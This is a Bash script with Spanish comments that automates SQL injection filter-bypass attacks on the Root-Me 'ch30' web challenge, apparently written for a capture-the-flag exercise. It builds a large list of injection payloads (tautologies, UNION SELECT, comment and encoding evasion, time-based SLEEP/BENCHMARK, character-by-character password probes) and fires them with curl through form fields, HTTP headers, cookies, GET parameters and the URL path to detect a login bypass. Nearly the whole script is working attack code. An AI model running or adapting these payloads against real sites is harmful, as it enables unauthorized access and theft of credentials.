#!/bin/bash

# ================================================
# ESCANEO COMPLETO CON EVASIÓN DE FILTROS - CH30
# ================================================

URL="http://challenge01.root-me.org/web-serveur/ch30/"
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
RED='\033[0;31m'
NC='\033[0m'

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}  ESCANEO COMPLETO CON EVASIÓN${NC}"
echo -e "${BLUE}  CH30 - FILTER BYPASS${NC}"
echo -e "${BLUE}========================================${NC}"

# ============================================
# TÉCNICAS DE EVASIÓN
# ============================================

# 1. Bypass de espacios
SPACE_BYPASS=(
    "OR"           # Original
    "OR"           # Comentarios
    "OR"           # Tabulación
    "OR"           # Saltos de línea
)

# 2. Bypass de palabras clave
KEYWORD_BYPASS=(
    "OR"           # Original
    "OoR"          # Mayúsculas/minúsculas
    "Or"           # Mayúsculas/minúsculas
    "oR"           # Mayúsculas/minúsculas
    "O/**/R"       # Comentarios en medio
    "O%0aR"        # Saltos de línea
)

# 3. Bypass de operadores
OPERATOR_BYPASS=(
    "="            # Original
    "LIKE"         # LIKE en lugar de =
    "REGEXP"       # REGEXP en lugar de =
    "IN"           # IN en lugar de =
    "<>"           # Diferente
    ">"            # Mayor que
    "<"            # Menor que
)

# ============================================
# GENERAR PAYLOADS CON EVASIÓN
# ============================================

generate_payloads() {
    local base=$1
    local payloads=()
    
    # Payloads básicos
    payloads+=("' OR 1=1#")
    payloads+=("' OR '1'='1")
    payloads+=("' OR 1=1--")
    payloads+=("' || 1=1#")
    payloads+=("' AND 1=1#")
    payloads+=("' UNION SELECT 1,2,3,4#")
    payloads+=("' UNION SELECT 1,'admin','password',4#")
    payloads+=("'='#")
    payloads+=("' LIKE '%'#")
    payloads+=("1 OR 1=1#")
    
    # Con comentarios para espacios
    payloads+=("'/**/OR/**/1=1#")
    payloads+=("'/**/UNION/**/SELECT/**/1,2,3,4#")
    payloads+=("'/**/OR/**/'1'='1")
    
    # Con tabulación
    payloads+=("'%09OR%091=1#")
    payloads+=("'%09UNION%09SELECT%091,2,3,4#")
    
    # Con saltos de línea
    payloads+=("'%0aOR%0a1=1#")
    payloads+=("'%0aUNION%0aSELECT%0a1,2,3,4#")
    
    # Con null byte
    payloads+=("' OR 1=1;%00")
    payloads+=("' OR 1=1%00")
    
    # Con comentarios de bloque
    payloads+=("' OR 1=1/*")
    payloads+=("' UNION SELECT 1,2,3,4/*")
    
    # Con mayúsculas/minúsculas
    payloads+=("' OoR 1=1#")
    payloads+=("' Or 1=1#")
    payloads+=("' oR 1=1#")
    payloads+=("' O/**/R 1=1#")
    
    # Con doble escritura (para evadir filtros de palabras)
    payloads+=("' UNUNIONION SELSELECTECT 1,2,3,4#")
    payloads+=("' OORR 1=1#")
    
    # Con concatenación
    payloads+=("' || '1'='1")
    payloads+=("' AND '1'='1")
    
    # Con funciones
    payloads+=("' AND DATABASE()='db'#")
    payloads+=("' AND USER()='root'#")
    payloads+=("' AND @@version LIKE '%'#")
    
    # Con SLEEP (time-based)
    payloads+=("' AND SLEEP(5)#")
    payloads+=("' AND BENCHMARK(1000000,MD5('test'))#")
    
    # Con SUBSTRING (boolean-based)
    for char in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
        payloads+=("' AND SUBSTRING(pass,1,1)='$char'#")
        payloads+=("' AND MID(pass,1,1)='$char'#")
        payloads+=("' AND LEFT(pass,1)='$char'#")
    done
    
    # Con comentarios condicionales MySQL
    payloads+=("'/*!UNION*/ /*!SELECT*/ 1,2,3,4#")
    payloads+=("'/*!OR*/ 1=1#")
    
    # Con codificación URL
    payloads+=("%27%20OR%201=1%23")
    payloads+=("%27%20UNION%20SELECT%201%2C2%2C3%2C4%23")
    payloads+=("%2527%20OR%201=1%23")
    
    # Con polyglot
    payloads+=("' AND 1=1 UNION SELECT 1,2,3,4#")
    payloads+=("' OR 1=1/*!UNION SELECT 1,2,3,4*/#")
    
    # Con comentarios anidados
    payloads+=("'/*!/*!UNION*/ /*!SELECT*/ 1,2,3,4*/#")
    
    # Con HTML entities (si se decodifican)
    payloads+=("&#39; OR 1=1#")
    payloads+=("&#x27; OR 1=1#")
    
    echo "${payloads[@]}"
}

# ============================================
# FUNCIÓN PARA PROBAR PAYLOADS
# ============================================

test_payload() {
    local method=$1
    local field=$2
    local payload=$3
    local desc=$4
    local extra=$5
    
    TOTAL=$((TOTAL + 1))
    
    echo -ne "${BLUE}[$TOTAL]${NC} ${desc}..."
    
    local response=""
    
    case $method in
        "POST")
            if [ -n "$extra" ]; then
                response=$(curl -s -X POST "$URL" -d "$field=$payload&$extra" 2>/dev/null)
            else
                response=$(curl -s -X POST "$URL" -d "$field=$payload" 2>/dev/null)
            fi
            ;;
        "GET")
            response=$(curl -s "$URL?$field=$payload" 2>/dev/null)
            ;;
        "HEADER")
            response=$(curl -s -X POST "$URL" -H "$field: $payload" -d "username=admin&password=test" 2>/dev/null)
            ;;
        "COOKIE")
            response=$(curl -s -X POST "$URL" -H "Cookie: $field=$payload" -d "username=admin&password=test" 2>/dev/null)
            ;;
        "PATH")
            response=$(curl -s "$URL$payload" 2>/dev/null)
            ;;
    esac
    
    # Verificar éxito
    if echo "$response" | grep -q "Membres" && ! echo "$response" | grep -q "login failed"; then
        echo -e " ${GREEN}✅ ÉXITO!${NC}"
        echo -e "    ${GREEN}Método: $method${NC}"
        echo -e "    ${GREEN}Campo: $field${NC}"
        echo -e "    ${GREEN}Payload: $payload${NC}"
        FOUND=$((FOUND + 1))
        return 0
    else
        echo -e " ${RED}❌${NC}"
        return 1
    fi
}

# ============================================
# VARIABLES DE CONTROL
# ============================================

TOTAL=0
FOUND=0

# ============================================
# 1. PROBAR EN CAMPOS POST (username, password)
# ============================================

echo -e "\n${YELLOW}[+] 1. Probando campos POST con evasión${NC}"
echo "--------------------------------------------------------"

PAYLOADS=$(generate_payloads)

for payload in $PAYLOADS; do
    # Probar en username
    test_payload "POST" "username" "$payload" "POST username: $payload" "password=test"
    # Probar en password
    test_payload "POST" "password" "$payload" "POST password: $payload" "username=admin"
done

# ============================================
# 2. PROBAR EN CABECERAS HTTP
# ============================================

echo -e "\n${YELLOW}[+] 2. Probando cabeceras HTTP con evasión${NC}"
echo "--------------------------------------------------------"

HEADERS=(
    "User-Agent"
    "Referer"
    "X-Forwarded-For"
    "X-Real-IP"
    "X-Originating-IP"
    "X-Remote-IP"
    "X-Remote-Addr"
    "X-Client-IP"
    "X-Host"
    "X-Forwarded-Host"
    "Accept"
    "Accept-Language"
    "Accept-Encoding"
    "Content-Type"
    "Content-Length"
    "Origin"
    "Connection"
    "Cache-Control"
    "Pragma"
)

for header in "${HEADERS[@]}"; do
    for payload in $PAYLOADS; do
        test_payload "HEADER" "$header" "$payload" "Header $header: $payload"
    done
done

# ============================================
# 3. PROBAR EN COOKIES
# ============================================

echo -e "\n${YELLOW}[+] 3. Probando cookies con evasión${NC}"
echo "--------------------------------------------------------"

COOKIES=(
    "PHPSESSID"
    "session"
    "user"
    "auth"
    "token"
    "sid"
    "JSESSIONID"
    "login"
    "admin"
)

for cookie in "${COOKIES[@]}"; do
    for payload in $PAYLOADS; do
        test_payload "COOKIE" "$cookie" "$payload" "Cookie $cookie: $payload"
    done
done

# ============================================
# 4. PROBAR EN PARÁMETROS GET
# ============================================

echo -e "\n${YELLOW}[+] 4. Probando parámetros GET con evasión${NC}"
echo "--------------------------------------------------------"

GET_PARAMS=(
    "action"
    "id"
    "page"
    "section"
    "view"
    "mode"
    "login"
    "user"
    "auth"
)

for param in "${GET_PARAMS[@]}"; do
    for payload in $PAYLOADS; do
        test_payload "GET" "$param" "$payload" "GET $param: $payload"
    done
done

# ============================================
# 5. PROBAR EN PATH DE URL
# ============================================

echo -e "\n${YELLOW}[+] 5. Probando path de URL con evasión${NC}"
echo "--------------------------------------------------------"

PATH_PAYLOADS=(
    "/' OR 1=1#"
    "/' UNION SELECT 1,2,3,4#"
    "/admin'--"
    "/' OR '1'='1"
    "/'/**/OR/**/1=1#"
    "/'%0aOR%0a1=1#"
)

for payload in "${PATH_PAYLOADS[@]}"; do
    test_payload "PATH" "" "$payload" "Path: $payload"
done

# ============================================
# 6. PROBAR EN MÉTODOS HTTP ALTERNATIVOS
# ============================================

echo -e "\n${YELLOW}[+] 6. Probando métodos HTTP alternativos${NC}"
echo "--------------------------------------------------------"

METHODS=("PUT" "DELETE" "PATCH" "OPTIONS" "HEAD")

for method in "${METHODS[@]}"; do
    TOTAL=$((TOTAL + 1))
    echo -ne "${BLUE}[$TOTAL]${NC} Método $method..."
    response=$(curl -s -X "$method" "$URL" -d "username=admin&password=test" 2>/dev/null)
    if echo "$response" | grep -q "Membres" && ! echo "$response" | grep -q "login failed"; then
        echo -e " ${GREEN}✅ ÉXITO!${NC}"
        echo -e "    ${GREEN}Método: $method${NC}"
        FOUND=$((FOUND + 1))
    else
        echo -e " ${RED}❌${NC}"
    fi
done

# ============================================
# 7. PROBAR CON DIFERENTES ENCODINGS
# ============================================

echo -e "\n${YELLOW}[+] 7. Probando encodings especiales${NC}"
echo "--------------------------------------------------------"

ENCODINGS=(
    "username=admin%27%20OR%201=1%23&password=test"
    "username=admin%2527%20OR%201=1%23&password=test"
    "username=admin%27%20UNION%20SELECT%201%2C2%2C3%2C4%23&password=test"
    "username=admin%27%20OR%20%271%27%3D%271%23&password=test"
)

for encoding in "${ENCODINGS[@]}"; do
    TOTAL=$((TOTAL + 1))
    echo -ne "${BLUE}[$TOTAL]${NC} Encoding: $encoding..."
    response=$(curl -s -X POST "$URL" -d "$encoding" 2>/dev/null)
    if echo "$response" | grep -q "Membres" && ! echo "$response" | grep -q "login failed"; then
        echo -e " ${GREEN}✅ ÉXITO!${NC}"
        echo -e "    ${GREEN}Encoding: $encoding${NC}"
        FOUND=$((FOUND + 1))
    else
        echo -e " ${RED}❌${NC}"
    fi
done

# ============================================
# 8. PROBAR CON DIFERENTES USER-AGENTS
# ============================================

echo -e "\n${YELLOW}[+] 8. Probando con diferentes User-Agents${NC}"
echo "--------------------------------------------------------"

USER_AGENTS=(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15"
    "Googlebot/2.1 (+http://www.google.com/bot.html)"
    "curl/7.68.0"
    "Wget/1.20.3 (linux-gnu)"
)

for ua in "${USER_AGENTS[@]}"; do
    TOTAL=$((TOTAL + 1))
    echo -ne "${BLUE}[$TOTAL]${NC} User-Agent: $ua..."
    response=$(curl -s -X POST "$URL" -H "User-Agent: $ua" -d "username=admin&password=test" 2>/dev/null)
    if echo "$response" | grep -q "Membres" && ! echo "$response" | grep -q "login failed"; then
        echo -e " ${GREEN}✅ ÉXITO!${NC}"
        echo -e "    ${GREEN}User-Agent: $ua${NC}"
        FOUND=$((FOUND + 1))
    else
        echo -e " ${RED}❌${NC}"
    fi
done

# ============================================
# RESUMEN FINAL
# ============================================

echo -e "\n${BLUE}========================================${NC}"
echo -e "${BLUE}  RESUMEN FINAL${NC}"
echo -e "${BLUE}========================================${NC}"

echo -e "\n${YELLOW}[+] Pruebas realizadas: $TOTAL${NC}"
echo -e "${GREEN}[+] Vulnerabilidades encontradas: $FOUND${NC}"

if [ $FOUND -gt 0 ]; then
    echo -e "\n${GREEN}========================================${NC}"
    echo -e "${GREEN}  ¡SE ENCONTRARON VULNERABILIDADES!${NC}"
    echo -e "${GREEN}  Revisa las líneas marcadas con ✅${NC}"
    echo -e "${GREEN}========================================${NC}"
else
    echo -e "\n${RED}========================================${NC}"
    echo -e "${RED}  NO SE ENCONTRARON VULNERABILIDADES${NC}"
    echo -e "${RED}========================================${NC}"
    echo -e "\n${YELLOW}[!] Posibles explicaciones:${NC}"
    echo -e "  1. El filtro es muy estricto y bloquea todo"
    echo -e "  2. La inyección no está en ningún campo visible"
    echo -e "  3. El desafío requiere un enfoque diferente"
fi

echo -e "\n${BLUE}========================================${NC}"
echo -e "${BLUE}  FIN DEL ESCANEO${NC}"
echo -e "${BLUE}========================================${NC}"
